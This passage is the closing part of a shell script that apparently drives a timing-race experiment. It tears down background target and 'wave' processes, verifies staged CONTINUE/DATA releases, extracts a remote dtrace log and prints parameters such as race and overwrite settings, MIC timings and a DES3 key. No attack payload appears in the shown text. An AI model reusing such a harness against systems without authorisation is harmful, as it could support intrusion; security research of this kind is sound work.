	kill "${event_bridge_pid}" 2>/dev/null || true
	wait "${event_bridge_pid}" 2>/dev/null || true
	event_bridge_pid=0
	if [[ ! -e "${target_continue_gate}" ]]; then
		fail "target MIC netevent bridge did not release CONTINUE"
	fi
elif [[ "${continue_release_mode}" == staged ]]; then
	wait "${event_bridge_pid}" 2>/dev/null ||
	    fail "staged destroy barrier did not release the DATA request"
	event_bridge_pid=0
	if ! grep -q '^staged_data_released ' "${base}.event.log"; then
		fail "staged DATA release was not confirmed"
	fi
fi

for attempt in $(seq 1 400); do
	if ! kill -0 "${target_pid}" 2>/dev/null ||
	    ! kill -0 "${wave_pid}" 2>/dev/null; then
		break
	fi
	sleep 0.1
done

if ! kill -0 "${target_pid}" 2>/dev/null &&
    kill -0 "${wave_pid}" 2>/dev/null; then
	for attempt in $(seq 1 15); do
		if ! kill -0 "${wave_pid}" 2>/dev/null; then
			break
		fi
		sleep 0.1
	done
fi

for pid in ${target_pid} ${wave_pid}; do
	if (( pid > 0 )); then
		kill "${pid}" 2>/dev/null || true
		wait "${pid}" 2>/dev/null || true
	fi
done
target_pid=0
wave_pid=0
if (( stage2_release_pid > 0 )); then
	wait "${stage2_release_pid}" 2>/dev/null || true
	stage2_release_pid=0
fi

sed -n '/^=== remote_dtrace ===$/,/^=== remote_dtrace_stderr ===$/p' \
    "${wave_log}" | sed '1d;$d' >"${local_trace}"

print "run_id=${run_id}"
print "continue_delay_us=${continue_delay_us}"
print "data_delay_us=${data_delay_us}"
print "race_data_count=${race_data_count}"
print "data_stagger_us=${data_stagger_us}"
print "selective_stage2_mode=${selective_stage2_mode}"
print "selective_stage2_delay_us=${selective_stage2_delay_us}"
print "candidate_min_aes_mic=${candidate_min_aes_mic}"
print "mic_hold_ns=${mic_hold_ns}"
print "dtrace_source=${dtrace_source}"
print "predictor_dword_range=${predictor_min_dword}-${predictor_max_dword}"
print "selective_pid_file=${selective_pid_file}"
print "acl_baseline_right=${acl_baseline_right}"
print "des3_wave_count=${des3_wave_count}"
print "continue_zero_token=${continue_zero_token}"
print "selective_release_mode=${selective_release_mode}"
print "selective_release_delay=${selective_release_delay}"
print "repair_continue_count=${repair_continue_count}"
print "repair_continue_delay_us=${repair_continue_delay_us}"
print "repair_continue_stagger_us=${repair_continue_stagger_us}"
print "plaintext_length=${plaintext_length}"
print "acl_workers=${acl_workers}"
print "acl_calls=${acl_calls}"
print "acl_release_mode=${acl_release_mode}"
print "acl_mode=${acl_mode}"
print "continue_release_mode=${continue_release_mode}"
print "target_location=${target_location}"
print "voucher_count=${voucher_count}"
print "fixed_sequence=${fixed_sequence:-none}"
print "des3_key=${des3_key}"
print "next_header=${next_header}"
print "selected_sequence=${selected_sequence}"
print "selected_overwrite=${selected_overwrite}"
print "target_log=${target_log}"
print "wave_log=${wave_log}"
print "trace=${local_trace}"
cat "${scan_log}" "${target_log}" "${des3_generate_log}" \
    "${base}.stage2.log" "${wave_log}" \
    "${local_trace}" 2>/dev/null
exit 0
